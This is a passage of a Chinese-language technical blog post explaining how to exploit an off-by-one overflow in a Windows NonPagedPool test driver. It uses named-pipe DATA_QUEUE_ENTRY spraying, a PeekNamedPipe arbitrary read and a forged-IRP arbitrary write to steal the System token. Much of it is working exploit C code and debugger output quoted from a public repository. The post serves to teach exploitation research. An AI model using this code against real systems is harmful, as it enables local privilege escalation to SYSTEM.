class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* buf = (<span class="type">char</span>*)ExAllocatePoolWithTag(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;[!] Allocate NonpagedPool 0x%p\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>for</code>循环中有一个明显的 <strong>off by one</strong> 漏洞(应当是<code>i &lt; Size</code>)，可以溢出到下一个区块一个字节，并修改为<code>0x20</code></p><p>测试环境是</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415100612979.png" alt="image-20250415100612979" style="zoom: 80%;" /><p>具体环境搭建可以参考：<a href="https://xz.aliyun.com/news/12806">从零探索现代windows内核栈溢出-以HEVD练习为例（上）</a>[3]</p><h2 id="如何完成提权"><a class="markdownIt-Anchor" href="#如何完成提权"></a> 如何完成提权</h2><p>这里就是利用任意地址读写来对<code>System</code>的<code>token</code>复制到当前进程</p><h2 id="任意地址读实现"><a class="markdownIt-Anchor" href="#任意地址读实现"></a> 任意地址读实现</h2><p>假设有如下布局</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/read.drawio.png" alt="Fig1" /></p><p>​AAAA、BBBB、CCCC三个<code>DATA_QUEUE_ENTRY</code>是逻辑上的相邻关系，<strong>但是在内存上，紫色page与BBBB相邻</strong>，所以<code>BBBB-&gt;Flink</code>低位被溢出了，这也是在linux pwn的堆利用中很常见的<code>off by one</code>利用手法。这使得<code>BBBB-&gt;Flink</code>指向了<code>CCCC+0x20</code>的位置，那么我们就可以提前在我们可控的<code>CCCC-&gt;UserData</code>里面构建<code>fake EntryType</code>、<code>fake Quota</code>和最<strong>重要的<code>Fake DataSize</code></strong></p><p>​但是前文中说过<code>fake flink</code>由于不是我们可控的，所以使用<code>ReadFile</code>读取<code>pipe_pool_x</code>会通不过检验，<strong>但是[1]中发现一个新的方法可以绕过，即使用<code>PeekNamedPipe</code>函数</strong>，这个函数可以读取<code>pipe_pool_x</code>中的数据，而不造成释放和校验。假设<code>pipe_pool_x</code>是从AAAA开始的，那么客户端在<code>pipe_pool_x</code>读取<code>DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC</code>大小的数据时候，顺序就是，1.读取<code>AAAA-&gt;UserData DataSize_AAAA</code> 大小的数据；2.根据<code>AAAA-&gt;Flink</code>找到BBBB，再读取；3.根据<code>BBBB-&gt;overflown_Flink</code>找打Fake_CCCC，同时根据<code>Fake_CCCC-&gt;Fake-&gt;DataSize</code>的大小读取内存。而且这种方法可以放我们判断溢出的<code>pipe_pool</code>是哪个，这在池喷射中是十分有利的。</p><p>​**那么如何实现任意地址读取呢？**我们可以看看[1]中的exp是怎么做到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NP_HEADER_SIZE 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE&lt;&lt;32)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, <span class="number">0x5000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Couldn&#x27;t allocate base address %p\n&quot;</span>, USER_DATA_ENTRY_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating the RIGHT entries\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> victim_data[THIRD_ENTRY_SIZE];</span><br><span class="line">    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)victim_data;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(*dqe));</span><br><span class="line">    dqe-&gt;DataSize = THIRD_ENTRY_SIZE + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_pool.size(); i++) &#123;</span><br><span class="line">        WriteFile(pipe_pool[i].Write, &amp;dqe-&gt;Irp, THIRD_ENTRY_SIZE, &amp;res, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>USER_DATA_ENTRY_ADDR</code>计算出来的值是**<code>0xfd000000000</code><strong>，在Creating the RIGHT entries时，申请的dqe中，<code>dqe-&gt;quota=0xfd0</code>，<code>dqe-&gt;DataSize=0xfd0</code>，根据</strong>小端序<strong>在内存中的排列方式从右到左，<code>dqe-&gt;quota</code>和临近的32位大小全为0的<code>dqe-&gt;EntryTpye</code>的值，合成<code>fake-&gt;flink</code>，而且指向</strong><code>0xfd000000000</code>**。分配变为：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/read.drawio2.png" alt="read.drawio2" /></p><p>​相关的内存信息：</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415105505624.png" alt="image-20250415105505624" style="zoom:50%;" /><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415111307748.png" alt="image-20250415111307748" style="zoom:67%;" /><p>​参考最初始的布局图，如果我们想要读取的内容长度超过了<code>DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC</code>，那么就会从<code>FakeCCCC-&gt;flink</code>即**<code>0xfd000000000</code><strong>当作一个<code>DATA_QUEUE_ENTRY</code>，来满足我们的读取。这个时候exp中最开始的<code>VritualAlloc</code>就起到了关键作用，因为他申请到了</strong><code>0xfd000000000</code><strong>这一地址，<strong>即使这个地址不是在内核0xfd000000000中，而是在当前的进程中</strong>，我们就可以在这里伪造<code>DATA_QUEUE_ENTRY</code>，并且</strong>使用<code>unbuffered</code>类型来利用<code>Irp</code>实现内核的任意地址读取**。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareDataEntryForRead</span><span class="params">(DATA_QUEUE_ENTRY* dqe, IRP* irp, <span class="type">uint64_t</span> read_address)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(DATA_QUEUE_ENTRY));</span><br><span class="line">    dqe-&gt;EntryType = <span class="number">1</span>;</span><br><span class="line">    dqe-&gt;DataSize = <span class="number">-1</span>;</span><br><span class="line">    dqe-&gt;Irp = irp;</span><br><span class="line">    irp-&gt;AssociatedIrp = (PVOID)read_address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadMem</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">size_t</span> len, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(TOTAL_DATA_SIZE + <span class="number">1</span> + <span class="number">0x5000</span>);</span><br><span class="line">    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;</span><br><span class="line">    DWORD read;</span><br><span class="line"></span><br><span class="line">    assert(len &lt; <span class="number">0x5000</span>);</span><br><span class="line"></span><br><span class="line">    PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + <span class="number">0x1000</span>), addr);</span><br><span class="line">    PeekNamedPipe(g_victim_pipe-&gt;Read, buf, TOTAL_DATA_SIZE + <span class="number">1</span> + len, &amp;read, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(data, buf + TOTAL_DATA_SIZE + <span class="number">1</span>, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何读取到当前进程的Token地址？</strong></p><p>​与常规思路类似，我们依旧是找到当前进程的<code>EPROCESS</code>。首先基于此我们拥有了任意地址读，那么就可以泄露出一个正常的<code>DATA_QUEUE_ENTRY</code>，比如和CCCC物理地址相邻的dqe，我们称为<strong>DDDD</strong>(如上图)。exp中的DDDD是这样申请的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">ThreadedWriter</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* buf = (<span class="type">char</span>*)arg;</span><br><span class="line">    DWORD res;</span><br><span class="line"></span><br><span class="line">    WriteFile(g_victim_pipe-&gt;Write, buf, FIRST_ENTRY_SIZE, &amp;res, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    Sleep(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating an entry with size greater than the available pipe quota\n&quot;</span>);</span><br><span class="line">    CreateThread(<span class="number">0</span>, <span class="number">0</span>, ThreadedWriter, buf, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//we could have used overlapped/completion routines</span></span><br><span class="line">    Sleep(<span class="number">2000</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">//&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123334730.png" alt="image-20250415123334730" style="zoom:67%;" /><p>​<code>DDDD-&gt;Irp</code>结构具体如下，详细可见<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP 结构 （wdm.h）</a>[4]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_IRP</span><br></pre></td></tr></table></figure><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415114100503.png" alt="image-20250415114100503" style="zoom:67%;" /><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123735198.png" alt="image-20250415123735198" style="zoom: 80%;" /><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123659967.png" alt="image-20250415123659967" style="zoom:67%;" /><p>​这里又引申小问题：为什么要使用<code>CreateThread</code>来进行新的dqe？这就要提到<code>ThreadListEntry</code>的作用了</p><blockquote><p>当一个线程发起异步 I/O 操作时，内核会将 IRP 插入到线程的 <code>ThreadListEntry</code> 链表中。线程可以通过遍历该链表检查是否有未完成的 I/O 请求。</p></blockquote><p>​这里创建线程来创建起到的就是 <strong>线程发起异步 I/O 操作</strong> 的作用。在 Windows 内核中，每个线程都由一个 <code>ETHREAD</code>（Executive Thread）结构体表示，其中包含一个 <code>IrpList</code> 字段，用于管理该线程的所有 <strong>挂起（Pending）I/O 请求</strong>（即未完成的 IRP）</p><p>​我们查看这个Irp所属的线程是那个<code>_ETHREAD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_IRP ffffbe0f`9d473c30 Tail.Overlay.Thread</span><br><span class="line">   +0x078 Tail                : </span><br><span class="line">      +0x000 Overlay             : </span><br><span class="line">         +0x020 Thread              : 0xffffbe0f`9d0cb080 _ETHREAD</span><br><span class="line">0: kd&gt; dt nt!_ETHREAD 0xffffbe0f`9d0cb080 Tcb</span><br><span class="line">   +0x000 Tcb : _KTHREAD</span><br></pre></td></tr></table></figure><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132619853.png" alt="image-20250415132619853" style="zoom:67%;" /><p>​<code>_ETHREAD</code>结构体如下</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132206261.png" alt="image-20250415132206261" style="zoom:67%;" /><p>​如果你了解过windows内核提权的方法的话，如<a href="https://xz.aliyun.com/news/12808">从零探索现代windows内核栈溢出-以HEVD练习为例（下）</a>[5]，你就会了解到在栈溢出中我们使用的是<code>gs:[188h]</code>指向的是一个<code>_KTHREAD</code>结构体，通过<code>_KTHREAD</code>找到<code>_EPROECSS</code>，然后找到了当前进程的<code>_EPROCESS</code>，而且就可以通过遍历得到 <strong>System</strong> 的<code>_EPROCESS</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !thread 0xffffbe0f9d0cb080</span><br><span class="line">THREAD ffffbe0f9d0cb080  Cid 0ea8.0c30  Teb: 000000f50d798000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable</span><br><span class="line">    ffffbe0f9ff9f668  NotificationEvent</span><br><span class="line">IRP List:</span><br><span class="line">    ffffbe0f9d473c30: (0006,0358) Flags: 00060a00  Mdl: 00000000</span><br><span class="line">Not impersonating</span><br><span class="line">DeviceMap                 ffff8486d91f0b10</span><br><span class="line">Owning Process            ffffbe0f9da7e340       Image:         exploits.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132850919.png" alt="image-20250415132850919" /></p><p>​之后通过``EPROCESS<code>获得自身</code>ActiveProcessLinks`，同时向前/向后查找，找到pid=4的进程，则该进程就为System，之后就是根据偏移读取Token</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">GetProcessById</span><span class="params">(<span class="type">uint64_t</span> first_process, <span class="type">uint64_t</span> pid)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> current_pid = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> current_process = first_process;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], <span class="number">8</span>, (<span class="type">char</span>*)&amp;current_pid);</span><br><span class="line">        <span class="keyword">if</span> (current_pid == pid)</span><br><span class="line">            <span class="keyword">return</span> current_process;</span><br><span class="line"></span><br><span class="line">        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + <span class="number">8</span>, <span class="number">8</span>, (<span class="type">char</span>*)&amp;current_process);</span><br><span class="line">        current_process -= c_offsets[g_setoff][EPROCESS_PID] + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (current_process == first_process)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="type">char</span> irp_data[<span class="number">0x1000</span>];</span><br><span class="line">    ReadMem(irp_addr, <span class="number">0x1000</span>, irp_data);</span><br><span class="line">    IRP* irp = (IRP*)irp_data;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> cp_thread_list_head, current_process, current_process_id, system_process;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds</span></span><br><span class="line">    ReadMem((<span class="type">uint64_t</span>)irp-&gt;ThreadListEntry.Flink + <span class="number">0x38</span>, <span class="number">8</span>, (<span class="type">char</span>*)&amp;cp_thread_list_head);</span><br><span class="line">    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];</span><br><span class="line">    ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], <span class="number">8</span>, (<span class="type">char</span>*)&amp;current_process_id);</span><br><span class="line">    <span class="keyword">if</span> (current_process_id != GetCurrentProcessId())</span><br><span class="line">        g_setoff++;</span><br><span class="line"></span><br><span class="line">    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];</span><br><span class="line"></span><br><span class="line">    system_process = GetProcessById(current_process, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Found current process: %p system process: %p\n&quot;</span>, current_process, system_process);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="任意地址写实现"><a class="markdownIt-Anchor" href="#任意地址写实现"></a> 任意地址写实现</h2><p>​根据前文的描述，当客户端<strong>读取</strong>服务端发送的消息时，利用甚于配额分配机制，<code>Quota&lt;Datasize</code>，就会触发对应dqe的Irp，将<code>irp-&gt;AssociatedIrp</code>的值写入到<code>irp-&gt;UserBuffer</code>中。那么我们可以伪造Irp，然后执行<code>ReadFile</code>触发Irp。但是Irp对于系统来说十分的严格，[1]中利用了任意读复制一个合法的Irp，然后改造。原文提醒：</p><blockquote><p>务必使用非缓冲条目来保存伪造的 IRP，因为它很可能会在 IofCompleteRequest 调用结束时被释放</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry.Flink=可访问的合法地址;</span><br><span class="line"> Irp=特殊伪造的irp;</span><br><span class="line"> SecurityContext=0;</span><br><span class="line"> EntryType=0;</span><br><span class="line"> QuotaInEntry=DataSize-1;</span><br><span class="line"> DataSize=任意地址写的大小;</span><br><span class="line"> x=无所谓;</span><br><span class="line"> </span><br><span class="line">Forged IRP:</span><br><span class="line"> Flags=Flags&amp;~IRP_DEALLOCATE_BUFFER|IRP_BUFFERED_IO|IRP_INPUT_OPERATION;</span><br><span class="line"> AssociatedIrp=源地址;</span><br><span class="line"> UserBuffer=目的地址;</span><br><span class="line"> ThreadListEntry.Flink-&gt;Blink==ThreadListEntry.Blink-&gt;Flink==&amp;ForgedIRPAddr-&gt;ThreadListEntry;</span><br></pre></td></tr></table></figure><p>​相关代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareWriteIRP</span><span class="params">(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address)</span> &#123;</span><br><span class="line">    irp-&gt;Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;</span><br><span class="line">    irp-&gt;AssociatedIrp = source_address;</span><br><span class="line">    irp-&gt;UserBuffer = destination_address;</span><br><span class="line">    irp-&gt;ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);</span><br><span class="line">    irp-&gt;ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">     <span class="type">uint64_t</span> thread_list[<span class="number">2</span>];</span><br><span class="line"> PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN]));</span><br><span class="line">    NtFsControlFile(g_victim_pipe-&gt;Write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, irp, <span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建unbuffered存放伪造的Irp</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​回忆前文<a href="##%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E4%BB%8B%E7%BB%8D">命名管道介绍</a>中的描述：</p><blockquote><p><code>unbuffered</code>: <code>EntryType=1</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小只存放<code>DATA_QUEUE_ENTRY</code></strong>，读取时要调用<code>IRP</code>来实现读取。</p></blockquote><p>​那么对<code>PrepareWriteIRP</code>函数生成的Irp这块内存的读写都要通过<code>unbuffered-&gt;Irp</code>进行</p><img src="D:\Blog\github\source\_posts\win-exp-big-non-paged-pool-overflow.assets\image-20250415155606850.png" alt="image-20250415155606850" style="zoom:80%;" /><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415155735870.png" alt="image-20250415155735870" style="zoom:80%;" /><p>​如果Irp执行就是从<code>0xffffe20fa485e4f8</code>的值复制到<code>0xffffe20faab3b538</code>，并且<code>0xffffe20fa485e4f8</code>的值就为Token的值</p><p>​然后设置<code>qde-&gt;Irp</code>后触发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareDataEntryForWrite</span><span class="params">(DATA_QUEUE_ENTRY* dqe, IRP* irp, <span class="type">uint32_t</span> size)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(DATA_QUEUE_ENTRY));</span><br><span class="line">    dqe-&gt;Flink = (<span class="type">uint64_t</span>)dqe;</span><br><span class="line">    dqe-&gt;EntryType = <span class="number">0</span>;</span><br><span class="line">    dqe-&gt;DataSize = size;</span><br><span class="line">    dqe-&gt;Irp = irp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;</span><br><span class="line">    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);</span><br><span class="line"></span><br><span class="line">    thread_list[<span class="number">0</span>] = thread_list[<span class="number">1</span>] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n&quot;</span>);</span><br><span class="line">    ReadFile(g_victim_pipe-&gt;Read, buf, ARBITRARY_WRITE_SIZE, &amp;res, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//...    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>ReadFile</code>时，依旧会从AAAA开始读取8字节，同时<code>AAAA-&gt;quota-=8</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415151904648.png" alt="image-20250415151904648" /></p><p>​之后会调整队列中dqe的quota大小，正常来说对于我们伪造的dqe的<code>quota&lt;size</code>的，这个时候就会调用Irp，然后<code>quota+=8</code>；但是我们修改了<code>CCCC-&gt;flink=DDDD</code>，即指向<code>0xfd000000000</code>，并且我们在DDDD中伪造了Irp，那么就会调用该Irp。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415152714453.png" alt="image-20250415152714453" /></p><p>​最后成功复制token完成提权</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415143758994.png" alt="image-20250415143758994" style="zoom:80%;" /><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415144332735.png" alt="image-20250415144332735" /></p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p>[1] <a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a> <a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">【免杀】使用CobaltStrike的外置监听器绕过检测</a> <a href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg</a></p><p>[3] <a href="https://xz.aliyun.com/news/12806">从零探索现代windows内核栈溢出-以HEVD练习为例（上）</a><a href="https://xz.aliyun.com/news/12806">https://xz.aliyun.com/news/12806</a></p><p>[4] <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP 结构 （wdm.h）</a> <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p><p>[5] <a href="https://xz.aliyun.com/news/12808">从零探索现代windows内核栈溢出-以HEVD练习为例（下）</a> <a href="https://xz.aliyun.com/news/12808">https://xz.aliyun.com/news/12808</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;内核也太难了，主要讲述大NonPagedPool的溢出利用&lt;/p&gt;
